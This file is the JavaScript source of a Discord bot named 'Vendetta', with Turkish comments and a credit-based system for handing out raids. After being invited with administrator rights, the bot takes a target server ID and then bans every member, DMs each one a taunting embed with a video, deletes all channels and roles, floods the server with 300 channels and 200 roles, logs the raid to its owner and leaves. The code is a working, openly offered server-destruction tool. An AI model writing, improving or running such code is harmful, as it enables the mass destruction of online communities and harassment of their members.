require('dotenv').config();
const {
Client, GatewayIntentBits, Partials,
EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
ModalBuilder, TextInputBuilder, TextInputStyle,
StringSelectMenuBuilder
} = require('discord.js');

// Node 22 fetch fix
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
intents: [
GatewayIntentBits.Guilds,
GatewayIntentBits.GuildMessages,
GatewayIntentBits.MessageContent,
GatewayIntentBits.GuildMembers
],
partials: [Partials.Channel]
});

// ENV
const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;

let cachedVideo = null;
let haklar = {};
let haklarMessageId = null;
let whitelist = {};
let whitelistMessageId = null;

// Video cache
client.once("ready", async () => {
console.log(🚀 Bot aktif: ${client.user.tag});

const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
try {
const res = await fetch(videoURL);
const buffer = Buffer.from(await res.arrayBuffer());
cachedVideo = { attachment: buffer, name: "video.mp4" };
console.log("🎥 Video cachelendi!");
} catch (err) {
console.log("❌ Video cache hatası:", err);
}
});

// Hak mesajı güncelle
async function updateHaklarMessage(channel) {
let description = "🟦⬜🟥 HAK TABLOSU 🟥⬜🟦\n\n";

for (const id in haklar) {
const member = await channel.guild.members.fetch(id).catch(() => null);
const name = member ? member.user.tag : id;
const count = haklar[id];

let colorBox = "🟥";  
if (count > 15) colorBox = "🟦⬜🟦";  
else if (count > 10) colorBox = "🟦";  
else if (count > 5) colorBox = "⬜";  

description += `${colorBox} ${name} — **${count} Hak**\n`;

}

if (haklarMessageId) {
const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
if (msg) return msg.edit({ content: description }).catch(() => {});
}

const msg = await channel.send({ content: description });
haklarMessageId = msg.id;
}

// Whitelist mesajı güncelle
async function updateWhitelistMessage(channel) {
let description = "📜 WHITELIST SUNUCULARI\n\n";

for (const id in whitelist) {
description += ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n;
}

if (whitelistMessageId) {
const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
if (msg) return msg.edit({ content: description }).catch(() => {});
}

const msg = await channel.send({ content: description });
whitelistMessageId = msg.id;
}

// Hak komutları
async function hakCommand(message, args, hakChannel) {
if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

const command = message.content.trim().split(/ +/)[0].toLowerCase();
const userId = args[0];
const count = parseInt(args[1]) || 1;

if (command === ".hakver") {
haklar[userId] = (haklar[userId] || 0) + count;
await updateHaklarMessage(hakChannel);
return message.reply(✅ ${count} hak verildi.);
}

if (command === ".hakal") {
haklar[userId] = Math.max((haklar[userId] || 0) - count, 0);
await updateHaklarMessage(hakChannel);
return message.reply(✅ ${count} hak alındı.);
}

if (command === ".hakk") {
await updateHaklarMessage(hakChannel);
return;
}
}

// Vendetta komutu
async function vendettaCommand(message) {
const hak = haklar[message.author.id] || 0;
if (hak <= 0) {
return message.author.send({ content: "❌ Vendetta hakkın yok!" }).catch(() => {});
}

const button = new ActionRowBuilder().addComponents(
new ButtonBuilder()
.setCustomId("sorguHak")
.setLabel("💣 Vendetta Başlat")
.setStyle(ButtonStyle.Primary)
);

await message.author.send({
content: 🔥 Vendetta hakkın: **${hak}**\n\nBotu davet etmek için:\nhttps://discord.com/oauth2/authorize?client_id=1444720893548040223&permissions=8&scope=bot,
components: [button]
}).catch(() => {});
}

// Panel
async function openPanel(interaction) {
if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) {
return interaction.reply({ content: "❌ Bu paneli açamazsın.", ephemeral: true });
}

const embed = new EmbedBuilder()
.setTitle("⬜⚡ Vendetta Panel ⚡⬜")
.setDescription("İşlem seç.")
.setColor("Grey");

const buttonRow = new ActionRowBuilder().addComponents(
new ButtonBuilder().setCustomId("silPanel").setLabel("🗑️ Paneli Sil").setStyle(ButtonStyle.Danger)
);

const selectRow = new ActionRowBuilder().addComponents(
new StringSelectMenuBuilder()
.setCustomId("panelMenu")
.setPlaceholder("Sistem seç")
.addOptions([
{ label: "Whitelist Sistemi", value: "whitelist" },
{ label: "Hak Sistemi", value: "hak" }
])
);

await interaction.reply({
embeds: [embed],
files: [cachedVideo],
components: [selectRow, buttonRow],
ephemeral: true
});
}

// Interaction
client.on("interactionCreate", async interaction => {
if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;

// Panel silme
if (interaction.customId === "silPanel") {
if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) return;
return interaction.message.delete().catch(() => {});
}

// Menü
if (interaction.customId === "panelMenu") {
let embed;
let row;

if (interaction.values[0] === "whitelist") {  
  embed = new EmbedBuilder()  
    .setTitle("Whitelist Sistemi")  
    .setDescription("Bir işlem seç.")  
    .setColor("Blue");  

  row = new ActionRowBuilder().addComponents(  
    new StringSelectMenuBuilder()  
      .setCustomId("wlMenu")  
      .addOptions([  
        { label: "Whitelist Ekle", value: "wlEkle" },  
        { label: "Whitelist Çıkar", value: "wlCikar" },  
        { label: "Whitelist Listele", value: "wlListele" }  
      ])  
  );  
}  

if (interaction.values[0] === "hak") {  
  embed = new EmbedBuilder()  
    .setTitle("Hak Sistemi")  
    .setDescription("Bir işlem seç.")  
    .setColor("Blue");  

  row = new ActionRowBuilder().addComponents(  
    new StringSelectMenuBuilder()  
      .setCustomId("hakMenu")  
      .addOptions([  
        { label: "Hak Ekle", value: "hakEkle" },  
        { label: "Hak Çıkar", value: "hakCikar" },  
        { label: "Hak Listele", value: "hakListele" }  
      ])  
  );  
}  

return interaction.update({ embeds: [embed], components: [row] });

}

// Whitelist modal
if (interaction.customId === "wlMenu") {
const choice = interaction.values[0];
const modal = new ModalBuilder().setCustomId(choice).setTitle("Whitelist İşlemi");

if (choice !== "wlListele") {  
  const sunucuInput = new TextInputBuilder()  
    .setCustomId("guildID")  
    .setLabel("Sunucu ID")  
    .setStyle(TextInputStyle.Short)  
    .setRequired(true);  

  modal.addComponents(new ActionRowBuilder().addComponents(sunucuInput));  
}  

return interaction.showModal(modal);

}

// Hak modal
if (interaction.customId === "hakMenu") {
const choice = interaction.values[0];
const modal = new ModalBuilder().setCustomId(choice).setTitle("Hak İşlemi");

if (choice !== "hakListele") {  
  const userInput = new TextInputBuilder()  
    .setCustomId("userID")  
    .setLabel("Kullanıcı ID")  
    .setStyle(TextInputStyle.Short)  
    .setRequired(true);  

  const countInput = new TextInputBuilder()  
    .setCustomId("count")  
    .setLabel("Hak Sayısı")  
    .setStyle(TextInputStyle.Short)  
    .setRequired(true);  

  modal.addComponents(  
    new ActionRowBuilder().addComponents(userInput),  
    new ActionRowBuilder().addComponents(countInput)  
  );  
}  

return interaction.showModal(modal);

}

// Modal işlemleri
if (interaction.isModalSubmit()) {
const id = interaction.customId;

if (id === "wlEkle") {  
  const guildID = interaction.fields.getTextInputValue("guildID");  
  const guild = client.guilds.cache.get(guildID);  

  if (!guild) return interaction.reply({ content: "❌ Sunucu bulunamadı!", ephemeral: true });  

  const owner = await guild.fetchOwner().catch(() => null);  

  whitelist[guildID] = {  
    name: guild.name,  
    ownerTag: owner ? owner.user.tag : "Unknown"  
  };  

  const wlChannel = await client.channels.fetch(WL_KANAL_ID);  
  await updateWhitelistMessage(wlChannel);  

  return interaction.reply({ content: "✅ Sunucu whitelist'e eklendi.", ephemeral: true });  
}  

if (id === "wlCikar") {  
  const guildID = interaction.fields.getTextInputValue("guildID");  
  delete whitelist[guildID];  

  const wlChannel = await client.channels.fetch(WL_KANAL_ID);  
  await updateWhitelistMessage(wlChannel);  

  return interaction.reply({ content: "🟦 Sunucu whitelist'ten çıkarıldı.", ephemeral: true });  
}  

if (id === "wlListele") {  
  const wlChannel = await client.channels.fetch(WL_KANAL_ID);  
  await updateWhitelistMessage(wlChannel);  

  return interaction.reply({ content: "📜 Whitelist listesi güncellendi.", ephemeral: true });  
}  

// Haklar  
if (id === "hakEkle" || id === "hakCikar") {  
  const userID = interaction.fields.getTextInputValue("userID");  
  const count = parseInt(interaction.fields.getTextInputValue("count"));  

  haklar[userID] =  
    id === "hakEkle"  
      ? (haklar[userID] || 0) + count  
      : Math.max((haklar[userID] || 0) - count, 0);  

  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);  
  await updateHaklarMessage(hakChannel);  

  return interaction.reply({ content: "🔄 Haklar güncellendi.", ephemeral: true });  
}  

if (id === "hakListele") {  
  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);  
  await updateHaklarMessage(hakChannel);  

  return interaction.reply({ content: "🧾 Hak listesi güncellendi.", ephemeral: true });  
}  

// Vendetta modal  
if (id === "modalSunucuID") {  
  const guildId = interaction.fields.getTextInputValue("sunucuID");  
  const guild = client.guilds.cache.get(guildId);  

  if (!guild) {  
    return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });  
  }  

  // ❗ WHITELIST KONTROLÜ  
  if (whitelist[guildId]) {  
    const owner = await client.users.fetch(OWNER_ID);  
    const guildOwner = await guild.fetchOwner().catch(() => null);  

    const logEmbed = new EmbedBuilder()  
      .setColor("Gold")  
      .setTitle("⚠️ WHITELIST SUNUCUSUNA VENDETTA DENEMESİ")  
      .addFields(  
        { name: "İşlem Yapan", value: `${interaction.user.tag} (${interaction.user.id})` },  
        { name: "Sunucu", value: `${guild.name} (${guild.id})` },  
        {  
          name: "Sunucu Sahibi",  
          value: guildOwner ? `${guildOwner.user.tag} (${guildOwner.id})` : "Bilinmiyor"  
        }  
      )  
      .setTimestamp();  

    owner.send({ embeds: [logEmbed] }).catch(() => {});  

    return interaction.reply({  
      content: "⚠️ Bu sunucu whitelist’te! İşlem engellendi.",  
      ephemeral: true  
    });  
  }  

  await interaction.reply({ content: "⚡ Vendetta başlatılıyor...", ephemeral: true });  

  haklar[interaction.user.id] -= 1;  

  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);  
  await updateHaklarMessage(hakChannel);  

  const embed = new EmbedBuilder()  
    .setColor("Red")  
    .setTitle("💣 VENDETTA GİRDİ!")  
    .setDescription("Slained by VENDETTA 💣\nhttps://discord.gg/j9W6FXKTre");  

  const members = await guild.members.fetch();  
  let bannedCount = 0;  
  const tasks = [];  

  for (const member of members.values()) {  
    if (member.user.bot) continue;  
    if ([OWNER_ID, SERI_ID].includes(member.id)) continue;  

    tasks.push(member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {}));  
    tasks.push(member.ban({ reason: "VENDETTA" }).catch(() => {}));  
    bannedCount++;  
  }  

  guild.channels.cache.forEach(ch =>  
    tasks.push(ch.delete().catch(() => {}))  
  );  

  for (let i = 0; i < 300; i++) {  
    tasks.push(  
      guild.channels.create({  
        name: `VENDETTA-${i}`  
      }).catch(() => {})  
    );  
  }  

  guild.roles.cache.forEach(r => {  
    if (r.editable && r.id !== guild.id)  
      tasks.push(r.delete().catch(() => {}));  
  });  

  for (let i = 0; i < 200; i++) {  
    const clr = `#${Math.floor(Math.random() * 16777215)  
      .toString(16)  
      .padStart(6, "0")}`;  

    tasks.push(  
      guild.roles.create({  
        name: "VENDETTA🔥",  
        color: clr  
      }).catch(() => {})  
    );  
  }  

  await Promise.all(tasks);  

  await interaction.followUp({  
    content: `🔥 ${bannedCount} kişi banlandı.`,  
    ephemeral: true  
  });  

  // Owner log  
  const owner = await client.users.fetch(OWNER_ID);  
  const guildOwner = await guild.fetchOwner().catch(() => null);  

  const logEmbed = new EmbedBuilder()  
    .setColor("Red")  
    .setTitle("💣 VENDETTA OPERASYON RAPORU")  
    .addFields(  
      { name: "İşlemi Yapan", value: `${interaction.user.tag} (${interaction.user.id})` },  
      { name: "Sunucu", value: `${guild.name} (${guild.id})` },  
      {  
        name: "Sunucu Sahibi",  
        value: guildOwner  
          ? `${guildOwner.user.tag} (${guildOwner.id})`  
          : "Bulunamadı"  
      },  
      { name: "Kalan Hak", value: `${haklar[interaction.user.id]}` }  
    )  
    .setTimestamp();  

  owner.send({ embeds: [logEmbed] }).catch(() => {});  

  await guild.leave().catch(() => {});  
}

}

// Vendetta buton
if (interaction.customId === "sorguHak") {
const hak = haklar[interaction.user.id] || 0;
if (hak <= 0)
return interaction.reply({ content: "Hak yok!", ephemeral: true });

const modal = new ModalBuilder()  
  .setCustomId("modalSunucuID")  
  .setTitle("Sunucu ID Gir");  

modal.addComponents(  
  new ActionRowBuilder().addComponents(  
    new TextInputBuilder()  
      .setCustomId("sunucuID")  
      .setLabel("Sunucu ID")  
      .setStyle(TextInputStyle.Short)  
      .setRequired(true)  
  )  
);  

await interaction.showModal(modal);

}
});

// Mesaj komutları
client.on("messageCreate", async message => {
if (!message.guild || message.author.bot) return;

const args = message.content.trim().split(/ +/);
const cmd = args.shift().toLowerCase();

const hakChannel = await client.channels.fetch(HAK_KANAL_ID);

if (cmd === ".vndt") {
return openPanel(message);
}

if (cmd === ".vendetta") {
return vendettaCommand(message);
}

await hakCommand(message, args, hakChannel);
});

client.login(process.env.BOT_TOKEN);
